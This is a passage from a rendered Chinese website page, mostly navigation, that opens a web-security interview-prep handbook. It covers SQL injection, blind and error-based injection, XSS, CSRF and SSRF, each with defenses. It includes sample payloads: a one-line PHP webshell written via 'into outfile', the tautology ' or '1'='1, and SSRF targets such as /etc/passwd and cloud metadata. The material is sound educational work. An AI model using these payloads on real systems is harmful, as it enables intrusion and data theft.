+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎉 成就时刻
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/reflections/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔄 思考记录
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔄 思考记录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E7%A0%B4%E9%A2%98%E4%B9%8B%E4%BD%99-%E4%BA%A6%E7%A0%B4%E5%BF%83%E9%9A%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ctf赛后复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E7%B3%BB%E7%BB%9F%E5%86%85%E9%83%A8%EF%BC%8C%E6%B8%85%E9%86%92%E8%BE%B9%E7%BC%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    系统内部，清醒边缘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E6%A1%A5%E7%9A%84%E8%93%9D%E5%9B%BE%EF%BC%9A%E4%BB%8E%E7%AC%AC%E4%B8%80%E5%9D%97%E7%A0%96%E5%88%B0%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    桥的蓝图：从第一块砖到开源框架
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E4%BB%8E%E4%BF%AF%E8%A7%86%E5%88%B0%E5%B9%B3%E8%A7%86%EF%BC%9A%E4%B8%80%E4%BB%BD%E5%86%85%E5%BF%83%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    从俯视到平视：一份内心笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E4%BB%A5%E6%80%9D%E5%BC%80%E8%B7%AF%EF%BC%8C%E4%BB%A5%E8%B7%AF%E8%BD%BD%E5%85%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    以思开路，以路载光
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/LINK%E6%B5%AE%E7%8E%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LINK浮现
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/family-letters/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💌 父母寄语
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💌 父母寄语
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/family-letters/%E5%88%9D%E5%8D%87%E9%AB%98_%E7%88%B6%E4%BA%B2%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    初升高_父亲寄语
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/family-letters/%E6%88%90%E4%BA%BA%E7%A4%BC_%E7%88%B6%E6%AF%8D%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    成人礼_父母寄语
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_8" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/portrait/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖼️ 个人画像
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🖼️ 个人画像
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/portrait/%E7%94%BB%E7%BA%A6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    画像师约定
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/portrait/%E8%A7%81%E5%B7%B1-%E7%83%9B%E7%85%A7-2026.7.2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    烛照之作
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    修桥工程
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    修桥工程
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../bridge/novel/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    《临风行》
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    《临风行》
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../bridge/novel/volume1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第一卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../bridge/novel/volume2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第二卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../bridge/novel/volume3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第三卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../updates/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    动态推送
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    动态推送
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📦 全部动态
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    精神食粮
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    精神食粮
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/images/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖼️ 照片
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🖼️ 照片
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/music/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎵 音乐
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎵 音乐
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/sentences/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💬 句子
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💬 句子
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../about/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于本站
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    关于本站
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/why/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    为什么建这个站
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../role-panel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ❗️ 角色档案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、使用建议
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#day" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、分类速查（Day ↔ 模块）
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="82-day">网络安全面试速答篇（每日一题 · 82 Day 版）<a class="headerlink" href="#82-day" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>面向 <strong>Web 渗透测试实习 / 护网 / 安全服务岗</strong> 的面试备考手册。
+由 <code>E:\tep_working\面试题</code> 下全部面试题合集整理去重而成，并整合 <code>Interview-Handbook.md</code> 与 <code>面试精华宝典.md</code> 双源，<strong>精选 82 道高频核心题</strong>，按"每日一题"编排。
+每题统一包含：<strong>题目 → 答案 → 解析 → 考察知识点</strong> 四部分。</p>
+</blockquote>
+<hr />
+<h2 id="_1">一、使用建议<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>每日一题</strong>：按顺序每天吃透 1 题，先自己口述答案，再对照本文查漏补缺。</li>
+<li><strong>复习闭环</strong>：当天题 = 理解答案 + 看懂解析 + 复盘知识点；周末把本周 7 题串成知识网。</li>
+<li><strong>动手验证</strong>：凡涉及命令/ payload 的题（如 sqlmap、nmap、提权），请在授权环境（靶场/CTF/自己机器）实操一遍，面试能讲出"我做过"。</li>
+<li><strong>进度跟踪</strong>：在每题前 <code>[ ]</code> 打勾，或在文末"学习打卡表"记录日期。</li>
+<li><strong>深度补充</strong>：每题末尾用 <code>→ 详见精讲第 X 题</code> 提示深度内容，可在《面试精华宝典.md》中展开学习。</li>
+</ol>
+<hr />
+<h2 id="day">二、分类速查（Day ↔ 模块）<a class="headerlink" href="#day" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>Day 范围</th>
+<th>题数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>一、Web 安全·常见漏洞原理与防护</td>
+<td>D1–D14</td>
+<td>14</td>
+</tr>
+<tr>
+<td>二、渗透测试流程与方法</td>
+<td>D15–D20</td>
+<td>6</td>
+</tr>
+<tr>
+<td>三、权限提升与内网渗透</td>
+<td>D21–D27</td>
+<td>7</td>
+</tr>
+<tr>
+<td>四、安全工具</td>
+<td>D28–D32</td>
+<td>5</td>
+</tr>
+<tr>
+<td>五、护网·红蓝对抗·应急响应</td>
+<td>D33–D38</td>
+<td>6</td>
+</tr>
+<tr>
+<td>六、网络协议与安全</td>
+<td>D39–D48</td>
+<td>10</td>
+</tr>
+<tr>
+<td>七、系统与中间件漏洞</td>
+<td>D49–D53</td>
+<td>5</td>
+</tr>
+<tr>
+<td>八、安全基础·等保·法律法规·加密</td>
+<td>D54–D58</td>
+<td>5</td>
+</tr>
+<tr>
+<td>九、代码审计与开发安全</td>
+<td>D59–D62</td>
+<td>4</td>
+</tr>
+<tr>
+<td>十、中间件与组件漏洞</td>
+<td>D63–D68</td>
+<td>6</td>
+</tr>
+<tr>
+<td>十一、操作系统 / 数据库 / 日志深入</td>
+<td>D69–D72</td>
+<td>4</td>
+</tr>
+<tr>
+<td>十二、加密深化 · 合规 · 移动 · 软技能</td>
+<td>D73–D82</td>
+<td>10</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="web">模块一　Web 安全·常见漏洞原理与防护<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
+<h3 id="day-1-sql">Day 1 ｜ SQL 注入的原理、分类与防护<a class="headerlink" href="#day-1-sql" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：请说明 SQL 注入的原理、常见分类，以及防御手段。
+<strong>答案</strong>：
+- <strong>原理</strong>：后端把用户输入直接拼接进 SQL 语句，未做校验/转义，导致用户输入被当作 SQL 代码执行，从而绕过逻辑、读取/篡改/删除数据。例：<code>select * from user where name='$name' and pw='$pw'</code>，输入 <code>pw = ' or '1'='1</code> 使条件恒真。
+- <strong>分类</strong>：按数据类型分数字型/字符型；按回显分联合查询、报错注入、布尔盲注、时间盲注、堆叠查询；按提交方式分 GET/POST/Cookie/HTTP 头注入。
+- <strong>防护</strong>：使用<strong>预编译（Prepared Statement / 参数化查询）</strong>；最小权限数据库账户；输入校验与白名单；ORM 框架；敏感操作加 WAF；错误回显关闭。
+<strong>解析</strong>：预编译是根本解法——SQL 语义与数据分离，参数永远作为值而非代码。WAF/过滤只是辅助，不能替代参数化。面试常追问"预编译就绝对安全吗？"——若仍用拼接（如 <code>order by $col</code>）或宽字节/二阶注入场景仍可能中招。
+<strong>考察知识点</strong>：SQL 语法、参数化查询、注入类型、纵深防御。</p>
+<h3 id="day-2-sql-webshell">Day 2 ｜ SQL 注入写文件（webshell）的条件<a class="headerlink" href="#day-2-sql-webshell" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：通过 MySQL 注入点直接写入一句话木马，需要哪些前提条件？
+<strong>答案</strong>：
+1. 网站<strong>绝对路径</strong>已知（报错/phpinfo/读取配置文件得到）；
+2. 当前数据库用户具备 <strong>File 权限</strong>（<code>select file_priv from mysql.user</code> 为 Y）；
+3. <code>secure_file_priv</code> 为空（非 <code>NULL</code> 限制目录）；
+4. <strong>写入口令</strong>对目标目录有写权限（通常 web 目录可写）；
+5. 用 <code>select '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/shell.php'</code> 导出。
+<strong>解析</strong>：<code>into outfile</code>/<code>into dumpfile</code> 受 <code>secure_file_priv</code> 严格限制（MySQL 5.6+ 默认 <code>NULL</code> 禁止导出）。<code>outfile</code> 会转义换行，<code>dumpfile</code> 不转义，写二进制用 dumpfile。若不能写文件，可改读文件（<code>load_file</code>）。
+<strong>考察知识点</strong>：MySQL 文件操作权限、secure_file_priv、getshell 路径。</p>
+<h3 id="day-3">Day 3 ｜ 盲注（布尔/时间）与报错注入<a class="headerlink" href="#day-3" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：没有回显时如何注入？报错注入常用函数有哪些？
+<strong>答案</strong>：
+- <strong>布尔盲注</strong>：构造 <code>and 1=1</code> / <code>and 1=2</code>，根据页面真假差异逐位猜解（配合 <code>substr()</code>/<code>ascii()</code>/<code>length()</code>）。
+- <strong>时间盲注</strong>：无差异时用 <code>and sleep(5)</code> 或 <code>if(...,sleep(5),0)</code>、<code>benchmark()</code> 看响应时延。
+- <strong>报错注入</strong>：利用报错回显数据，如 <code>updatexml(1,concat(0x7e,(select version()),0x7e),1)</code>、<code>extractvalue()</code>、<code>floor(rand(0)*2)</code> 主键冲突、<code>exp()</code> 溢出。
+<strong>解析</strong>：盲注效率低，实战用 <code>sqlmap -technique=B/T</code> 自动化；报错注入依赖特定函数报错且版本相关（updatexml/extractvalue 在 MySQL 5.x 通用）。<code>floor(rand(0)*2)</code> 需 <code>group by</code> 与 <code>count(*)</code> 配合。
+<strong>考察知识点</strong>：盲注逻辑、报错函数、sqlmap 技术参数。</p>
+<h3 id="day-4-xss">Day 4 ｜ XSS 类型与防御<a class="headerlink" href="#day-4-xss" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：XSS 有哪几种类型？如何防御？
+<strong>答案</strong>：
+- <strong>存储型</strong>：恶意脚本存于数据库，用户访问时服务端返回并执行（危害最大，如留言/评论）。
+- <strong>反射型</strong>：payload 在 URL 中，服务端原样返回到页面（需诱导点击）。
+- <strong>DOM 型</strong>：前端 JS 直接操作 DOM（如 <code>location.hash</code>、<code>innerHTML</code>）造成，不经过服务端。
+- <strong>防御</strong>：输出<strong>编码/转义</strong>（HTML 实体、JS、URL 编码按需）；输入校验白名单；<code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code> Cookie；CSP 策略；富文本用白名单过滤器（如 DOMPurify）。
+<strong>解析</strong>：存储型危害最高（可盗 Cookie、蠕变、配合 CSRF）。DOM 型要在前端代码层面修（不要在 <code>.innerHTML</code>/<code>.html()</code> 直接拼用户输入）。CSP 是纵深防御而非万能。
+<strong>考察知识点</strong>：XSS 三类区别、输出编码、CSP、HttpOnly。</p>
+<h3 id="day-5-csrf-xss">Day 5 ｜ CSRF 原理与防御，与 XSS 区别<a class="headerlink" href="#day-5-csrf-xss" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：CSRF 是什么？如何防护？它和 XSS 有何区别？
+<strong>答案</strong>：
+- <strong>原理</strong>：攻击者诱导已登录用户浏览器，在用户不知情下向存在漏洞的站点发起<strong>伪造请求</strong>（利用浏览器自动带 Cookie 的特性），以用户身份执行操作（改密码/转账）。
+- <strong>防护</strong>：<strong>CSRF Token</strong>（服务端随机令牌，请求必须携带且校验）；校验 <code>Referer</code>/<code>Origin</code>；<code>SameSite=Strict/Lax</code> Cookie；重要操作加二次认证/验证码。
+- <strong>与 XSS 区别</strong>：XSS 利用"用户对站点的信任"（盗取/执行）；CSRF 利用"站点对用户的信任"（冒用身份）。XSS 可盗 Token，CSRF 无法读响应。
+<strong>解析</strong>：Token 必须随机、不可预测、绑定会话且一次一用；<code>SameSite=Lax</code> 已能挡多数跨站场景。RESTful 接口若用自定义头（如 <code>X-Requested-With</code>）也能增加 CSRF 难度（简单请求不跨域发自定义头）。
+<strong>考察知识点</strong>：CSRF 利用链、Token、SameSite、与 XSS 边界。</p>
+<h3 id="day-6-ssrf">Day 6 ｜ SSRF 原理、利用与防御<a class="headerlink" href="#day-6-ssrf" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：SSRF 是什么？常见利用与防御？
+<strong>答案</strong>：
+- <strong>原理</strong>：服务端代用户发起请求，且 URL 由用户可控，攻击者可让服务器访问<strong>内网/本地</strong>资源（如 <code>http://127.0.0.1:6379</code>、<code>file:///etc/passwd</code>、<code>http://169.254.169.254/</code> 云元数据）。
+- <strong>利用</strong>：探测内网端口、攻击内网服务（Redis/MySQL）、读取本地文件、绕过授权访问云元数据（AK 泄露）、配合 Gopher 打内网协议。
+- <strong>防御</strong>：<strong>白名单</strong>协议（仅 http/https）与域名/IP；禁止访问内网与回环地址（正则过滤 <code>127.0.0.1</code>、<code>localhost</code>、<code>0.0.0.0</code>、十进制/八进制 IP 绕过需一并处理）；统一出网出口；需鉴权的内网服务加认证。
+<strong>解析</strong>：绕过手段多（DNS 重绑定、<code>xip.io</code>、进制转换、短网址），单纯黑名单不够，应做"解析后校验目标 IP 是否在内网"。这是云原生环境下的高危漏洞。
+<strong>考察知识点</strong>：SSRF 危害面、云元数据、DNS 重绑定、白名单校验。</p>
+<h3 id="day-7">Day 7 ｜ 命令执行 / 代码执行函数及防御<a class="headerlink" href="#day-7" title="Permanent link">&para;</a></h3>
+<p><strong>[ ] 题目</strong>：PHP/Java 中常见的命令执行、代码执行函数有哪些？如何防御？
+<strong>答案</strong>：
